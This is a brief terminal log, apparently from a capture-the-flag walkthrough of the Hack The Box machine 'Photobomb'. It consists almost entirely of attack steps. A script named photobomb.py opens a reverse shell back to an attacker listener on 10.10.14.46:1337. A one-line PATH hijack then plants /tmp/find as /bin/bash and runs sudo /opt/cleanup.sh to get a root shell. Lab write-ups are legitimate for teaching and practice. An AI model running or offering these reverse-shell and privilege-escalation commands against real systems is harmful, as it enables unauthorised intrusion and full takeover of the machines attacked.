```
┌──(root💀ghost)-[/home/ghost]
└─# python3 photobomb.py
Usage python3 photobomb.py <attacker ip> <attacker port>
                                                                                                                                                                                                   
┌──(root💀ghost)-[/home/ghost]
└─# python3 photobomb.py 10.10.14.46 1337
listening on [any] 1337 ...
connect to [10.10.14.46] from photobomb.htb [10.10.11.182] 47960
bash: cannot set terminal process group (702): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$
```
```
wizard@photobomb:~/photobomb$ echo '/bin/bash' > /tmp/find;chmod +x /tmp/find;sudo PATH=/tmp:$PATH /opt/cleanup.sh
whoami
root
```
